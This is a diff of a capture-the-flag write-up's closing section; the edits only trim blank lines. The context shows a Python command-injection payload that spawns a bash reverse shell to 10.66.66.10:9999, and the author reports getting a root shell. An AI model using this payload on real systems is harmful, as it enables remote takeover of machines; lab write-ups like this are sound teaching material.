@@ -152,7 +152,6 @@ Searching for python command injection, i found this [article](https://medium.co
 
 ```python
 __import__('os').system('bash -c "bash -i >& /dev/tcp/10.66.66.10/9999 0>&1"')#
-
 ```
 
 Now setup a listener and put the payload above in one of the input fields and click calculate.
@@ -164,5 +163,3 @@ Great! We got a shell as root.
 ---
 
 Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
-
----
